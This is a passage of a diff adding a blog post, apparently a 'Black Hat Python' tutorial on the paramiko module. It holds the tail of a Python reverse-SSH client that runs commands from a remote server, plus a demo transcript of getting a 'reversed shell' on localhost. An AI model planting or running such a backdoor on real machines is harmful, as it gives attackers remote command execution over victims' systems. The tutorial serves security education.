+                <span class="n">ssh_session</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">cmd_output</span><span class="p">)</span>
+            <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
+                <span class="n">ssh_session</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+        <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:]):</span>
+        <span class="n">usage</span><span class="p">()</span>
+    <span class="n">IP</span> <span class="o">=</span> <span class="s">&#39;0.0.0.0&#39;</span>
+    <span class="n">USER</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+    <span class="n">PASSWORD</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+    <span class="n">PORT</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">opts</span> <span class="o">=</span> <span class="n">getopt</span><span class="o">.</span><span class="n">getopt</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">:],</span><span class="s">&quot;p:u:a:&quot;</span><span class="p">,</span> \
+            <span class="p">[</span><span class="s">&quot;PORT&quot;</span><span class="p">,</span> <span class="s">&quot;USER&quot;</span><span class="p">,</span> <span class="s">&quot;PASSWORD&quot;</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="k">except</span> <span class="n">getopt</span><span class="o">.</span><span class="n">GetoptError</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
+        <span class="k">print</span> <span class="nb">str</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
+        <span class="n">usage</span><span class="p">()</span>
+    <span class="n">IP</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="k">print</span> <span class="s">&quot;[*] Initializing connection to &quot;</span> <span class="o">+</span> <span class="n">IP</span>
+    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">opts</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s">&#39;-a&#39;</span><span class="p">):</span>
+            <span class="n">PASSWORD</span> <span class="o">=</span> <span class="n">t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="k">elif</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s">&#39;-p&#39;</span><span class="p">):</span>
+            <span class="n">PORT</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">t</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+        <span class="k">elif</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s">&#39;-u&#39;</span><span class="p">):</span>
+            <span class="n">USER</span> <span class="o">=</span> <span class="n">t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span> <span class="s">&quot;This option does not exist!&quot;</span>
+            <span class="n">usage</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">USER</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">&quot;[*] User set to &quot;</span> <span class="o">+</span> <span class="n">USER</span>
+    <span class="k">if</span> <span class="n">PORT</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">&quot;[*] The port to be used is </span><span class="si">%d</span><span class="s">. &quot;</span> <span class="o">%</span> <span class="n">PORT</span>
+    <span class="k">if</span> <span class="n">PASSWORD</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">&quot;[*] A password with length </span><span class="si">%d</span><span class="s"> was submitted. &quot;</span> <span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">PASSWORD</span><span class="p">)</span>
+    <span class="n">ssh_client</span><span class="p">(</span><span class="n">IP</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">USER</span><span class="p">,</span> <span class="n">PASSWORD</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</pre></div>
+
+
+<h3>Running both Scripts</h3>
+<p>Let's run each script in a different terminal. First, the server:</p>
+<div class="highlight"><pre><span class="nv">$ </span>ssh_server.py localhost 22
+<span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for </span>connection ...
+</pre></div>
+
+
+<p>Then the client:</p>
+<div class="highlight"><pre><span class="nv">$ </span>ssh_client_reverse.py localhost -p 22 -u buffy -a killvampires
+<span class="o">[</span>*<span class="o">]</span> Initializing connection to localhost
+<span class="o">[</span>*<span class="o">]</span> User <span class="nb">set </span>to buffy
+<span class="o">[</span>*<span class="o">]</span> The port to be used is 22.
+<span class="o">[</span>*<span class="o">]</span> A password with length 12 was submitted.
+Welcome to Buffy<span class="err">&#39;</span>s SSH
+</pre></div>
+
+
+<p>Now we can send any command from the server side to run  in the client: we have a reversed shell!</p>
+<div class="highlight"><pre><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for </span>connection ...
+<span class="o">[</span>+<span class="o">]</span> Connection Established!
+<span class="o">[</span>+<span class="o">]</span> Authenticated!
+Enter <span class="nb">command</span>: ls
+filename.log
+ssh_client.py
+ssh_client_reverse.py
+ssh_server.py
+test_rsa.key
+
+Enter <span class="nb">command</span>:
+</pre></div>
+
+
+<p><strong>Awesomesauce!</strong></p>
+<p>Ah, by the way, all these scripts work not only in Linux but in Windows and Mac as well (so next time you are in a lame Windows machine, no need to install <a href="http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html">Putty</a> anymore =p ).</p>
+<hr />
+<h2>Further References:</h2>
+<ul>
+<li><a href="https://github.com/paramiko/paramiko/blob/master/demos/rforward.py">Paramikos reverse SSH tunneling</a>.</li>
+<li><a href="https://github.com/tristanfisher/ogre/blob/master/ogre">Ogre: port scanner and brute-force tool (from a friend I met at Hacker School)</a></li>
+<li><a href="http://www.nostarch.com/blackhatpython">Black Hat Python</a>.</li>
+<li><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources">My Gray hat repo</a>.</li>
+</ul>
+                </div><!-- /.entry-content -->
+                <div class="comments">
+                <h2>Comments !</h2>
+                        <div id="disqus_thread"></div>
+                        <script type="text/javascript">
+                           var disqus_identifier = "black-hat-python-the-paramiko-module.html";
+                           (function() {
+                                var dsq = document.createElement('script');
+                                dsq.type = 'text/javascript'; dsq.async = true;
+                                dsq.src = 'http://bt3gl.disqus.com/embed.js';
+                                (document.getElementsByTagName('head')[0] ||
+                                 document.getElementsByTagName('body')[0]).appendChild(dsq);
+                          })();
+                        </script>
+                </div>
+        </article>
+</section>
+        </div><!--/span-->
+
+                <div class="span3 well sidebar-nav" id="sidebar">
+<ul class="nav nav-list">
+
+
+
+<li class="nav-header"><h4>Categories</h4></li>
+<li>
+<a href="http://bt3gl.github.io/category/web-security.html">
+    <i class="icon-folder-open icon-large"></i>Web Security
+</a>
+</li>
+<li>
+<a href="http://bt3gl.github.io/category/vulnerabilities.html">
+    <i class="icon-folder-open icon-large"></i>Vulnerabilities
+</a>
+</li>
+<li>
+<a href="http://bt3gl.github.io/category/reverse-engineering.html">
+    <i class="icon-folder-open icon-large"></i>Reverse Engineering
+</a>
+</li>
+<li>
+<a href="http://bt3gl.github.io/category/networking.html">
+    <i class="icon-folder-open icon-large"></i>Networking
+</a>
+</li>
+<li>
+<a href="http://bt3gl.github.io/category/lifeuniverseeverything.html">
+    <i class="icon-folder-open icon-large"></i>Life,Universe,Everything
+</a>
+</li>
+<li>
+<a href="http://bt3gl.github.io/category/forensics.html">
+    <i class="icon-folder-open icon-large"></i>Forensics
+</a>
+</li>
+<li>
+<a href="http://bt3gl.github.io/category/cryptography.html">
+    <i class="icon-folder-open icon-large"></i>Cryptography
+</a>
+</li>
+
+<br>
+
+<li class="nav-header"><h4>Tags</h4></li>
+<ul class="tagcloud">
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/arp_poisining.html">
+        <i class="icon-tag icon-large"></i>ARP_poisining
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/chrome.html">
+        <i class="icon-tag icon-large"></i>Chrome
+    </a>
+</li>
+<li class="tag-1">
+    <a href="http://bt3gl.github.io/tag/python.html">
+        <i class="icon-tag icon-large"></i>Python
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/stripe.html">
+        <i class="icon-tag icon-large"></i>Stripe
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/outguess.html">
+        <i class="icon-tag icon-large"></i>OutGuess
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/cms.html">
+        <i class="icon-tag icon-large"></i>CMS
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/sql_injection.html">
+        <i class="icon-tag icon-large"></i>SQL_injection
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/iwconfig.html">
+        <i class="icon-tag icon-large"></i>iwconfig
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/kismet.html">
+        <i class="icon-tag icon-large"></i>Kismet
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/pcap.html">
+        <i class="icon-tag icon-large"></i>PCAP
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/pgp.html">
+        <i class="icon-tag icon-large"></i>PGP
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/binary_search.html">
+        <i class="icon-tag icon-large"></i>Binary_Search
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/mysql.html">
+        <i class="icon-tag icon-large"></i>MySQL
+    </a>
+</li>
+<li class="tag-2">
+    <a href="http://bt3gl.github.io/tag/sqli.html">
+        <i class="icon-tag icon-large"></i>SQLi
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/crl.html">
+        <i class="icon-tag icon-large"></i>CRL
+    </a>
+</li>
+<li class="tag-2">
+    <a href="http://bt3gl.github.io/tag/wireshark.html">
+        <i class="icon-tag icon-large"></i>Wireshark
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/hope.html">
+        <i class="icon-tag icon-large"></i>Hope
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/tcp.html">
+        <i class="icon-tag icon-large"></i>TCP
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/shellshock.html">
+        <i class="icon-tag icon-large"></i>Shellshock
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/lamp.html">
+        <i class="icon-tag icon-large"></i>LAMP
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/love.html">
+        <i class="icon-tag icon-large"></i>Love
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/pdf-parser.html">
+        <i class="icon-tag icon-large"></i>pdf-parser
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/qpdf.html">
+        <i class="icon-tag icon-large"></i>qpdf
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/traceroute.html">
+        <i class="icon-tag icon-large"></i>traceroute
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/stack_overflow.html">
+        <i class="icon-tag icon-large"></i>Stack_overflow
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/vigenere.html">
+        <i class="icon-tag icon-large"></i>Vigenere
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/timing_attack.html">
+        <i class="icon-tag icon-large"></i>Timing_attack
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/tls.html">
+        <i class="icon-tag icon-large"></i>TLS
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/xss.html">
+        <i class="icon-tag icon-large"></i>XSS
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/gdb.html">
+        <i class="icon-tag icon-large"></i>gdb
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/proxy.html">
+        <i class="icon-tag icon-large"></i>proxy
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/lfi.html">
+        <i class="icon-tag icon-large"></i>LFI
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/arp_spoofing.html">
+        <i class="icon-tag icon-large"></i>ARP_spoofing
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/arp.html">
+        <i class="icon-tag icon-large"></i>ARP
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/ifconfig.html">
+        <i class="icon-tag icon-large"></i>ifconfig
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/stack_overflow-nop.html">
+        <i class="icon-tag icon-large"></i>Stack_Overflow NOP
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/threading.html">
+        <i class="icon-tag icon-large"></i>threading
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/aes.html">
+        <i class="icon-tag icon-large"></i>AES
+    </a>
+</li>
+<li class="tag-2">
+    <a href="http://bt3gl.github.io/tag/socket.html">
+        <i class="icon-tag icon-large"></i>socket
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/vmware.html">
+        <i class="icon-tag icon-large"></i>VMWare
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/pycrypto.html">
+        <i class="icon-tag icon-large"></i>PyCrypto
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/ettercap.html">
+        <i class="icon-tag icon-large"></i>Ettercap
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/telnet.html">
+        <i class="icon-tag icon-large"></i>telnet
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/netsh.html">
+        <i class="icon-tag icon-large"></i>netsh
+    </a>
+</li>
+<li class="tag-2">
+    <a href="http://bt3gl.github.io/tag/ssh.html">
+        <i class="icon-tag icon-large"></i>SSH
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/crlsets.html">
+        <i class="icon-tag icon-large"></i>CRLSets
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/brute_force.html">
+        <i class="icon-tag icon-large"></i>Brute_Force
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/nosql.html">
+        <i class="icon-tag icon-large"></i>NoSQL
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/cache.html">
+        <i class="icon-tag icon-large"></i>cache
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/icmp.html">
+        <i class="icon-tag icon-large"></i>ICMP
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/redis.html">
+        <i class="icon-tag icon-large"></i>Redis
+    </a>
+</li>
+<li class="tag-2">
+    <a href="http://bt3gl.github.io/tag/php.html">
+        <i class="icon-tag icon-large"></i>PHP
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/udp.html">
+        <i class="icon-tag icon-large"></i>UDP
+    </a>
+</li>
+<li class="tag-1">
+    <a href="http://bt3gl.github.io/tag/csaw.html">
+        <i class="icon-tag icon-large"></i>CSAW
+    </a>
+</li>
+<li class="tag-2">
+    <a href="http://bt3gl.github.io/tag/wargames.html">
+        <i class="icon-tag icon-large"></i>Wargames
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/ecb.html">
+        <i class="icon-tag icon-large"></i>ECB
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/getopt.html">
+        <i class="icon-tag icon-large"></i>getopt
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/packet_header.html">
+        <i class="icon-tag icon-large"></i>packet_header
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/jad.html">
+        <i class="icon-tag icon-large"></i>jad
+    </a>
+</li>
+<li class="tag-2">
+    <a href="http://bt3gl.github.io/tag/javascript.html">
+        <i class="icon-tag icon-large"></i>JavaScript
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/jit.html">
+        <i class="icon-tag icon-large"></i>JIT
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/cain__abel.html">
+        <i class="icon-tag icon-large"></i>Cain_&_Abel
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/tr.html">
+        <i class="icon-tag icon-large"></i>tr
+    </a>
+</li>
+<li class="tag-2">
+    <a href="http://bt3gl.github.io/tag/linux.html">
+        <i class="icon-tag icon-large"></i>Linux
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/unicode.html">
+        <i class="icon-tag icon-large"></i>Unicode
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/base64.html">
+        <i class="icon-tag icon-large"></i>base64
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/csrf.html">
+        <i class="icon-tag icon-large"></i>CSRF
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/pygenere.html">
+        <i class="icon-tag icon-large"></i>pygenere
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/subprocess.html">
+        <i class="icon-tag icon-large"></i>subprocess
+    </a>
+</li>
+<li class="tag-1">
+    <a href="http://bt3gl.github.io/tag/ctf.html">
+        <i class="icon-tag icon-large"></i>CTF
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/rot13.html">
+        <i class="icon-tag icon-large"></i>ROT13
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/arpspoof.html">
+        <i class="icon-tag icon-large"></i>arpspoof
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/burpsuite.html">
+        <i class="icon-tag icon-large"></i>BurpSuite
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/coldfusion.html">
+        <i class="icon-tag icon-large"></i>ColdFusion
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/scapy.html">
+        <i class="icon-tag icon-large"></i>scapy
+    </a>
+</li>
+<li class="tag-2">
+    <a href="http://bt3gl.github.io/tag/buffer_overflow.html">
+        <i class="icon-tag icon-large"></i>Buffer_overflow
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/mem.html">
+        <i class="icon-tag icon-large"></i>mem
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/rce.html">
+        <i class="icon-tag icon-large"></i>RCE
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/sniffing.html">
+        <i class="icon-tag icon-large"></i>sniffing
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/nmap.html">
+        <i class="icon-tag icon-large"></i>Nmap
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/rfi.html">
+        <i class="icon-tag icon-large"></i>RFI
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/burp.html">
+        <i class="icon-tag icon-large"></i>Burp
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/c.html">
+        <i class="icon-tag icon-large"></i>C
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/assembly.html">
+        <i class="icon-tag icon-large"></i>assembly
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/xor.html">
+        <i class="icon-tag icon-large"></i>XOR
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/apphp.html">
+        <i class="icon-tag icon-large"></i>ApPHP
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/ocsp.html">
+        <i class="icon-tag icon-large"></i>OCSP
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/paillier.html">
+        <i class="icon-tag icon-large"></i>Paillier
+    </a>
+</li>
+<li class="tag-2">
+    <a href="http://bt3gl.github.io/tag/book.html">
+        <i class="icon-tag icon-large"></i>Book
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/bytecode.html">
+        <i class="icon-tag icon-large"></i>bytecode
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/netcat.html">
+        <i class="icon-tag icon-large"></i>netcat
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/command_injection.html">
+        <i class="icon-tag icon-large"></i>Command_Injection
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/shellcode.html">
+        <i class="icon-tag icon-large"></i>shellcode
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/ltrace.html">
+        <i class="icon-tag icon-large"></i>ltrace
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/ftp.html">
+        <i class="icon-tag icon-large"></i>FTP
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/decimal.html">
+        <i class="icon-tag icon-large"></i>Decimal
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/exiftool.html">
+        <i class="icon-tag icon-large"></i>ExifTool
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/bash.html">
+        <i class="icon-tag icon-large"></i>Bash
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/gpg.html">
+        <i class="icon-tag icon-large"></i>GPG
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/steganography.html">
+        <i class="icon-tag icon-large"></i>Steganography
+    </a>
+</li>
+
+
+</ul>
+
+        </div><!--/.well -->
+
+      </div><!--/row-->
+
+
+
+      <footer>
+        <address id="about">
+
+        </address><!-- /#about -->
+
+      </footer>
+
+    </div><!--/.fluid-container-->
+
+
+    <script src="http://bt3gl.github.io/theme/js/jquery-1.7.2.min.js"></script>
+    <script src="http://bt3gl.github.io/theme/js/bootstrap.min.js"></script>
+  </body>
+</html>
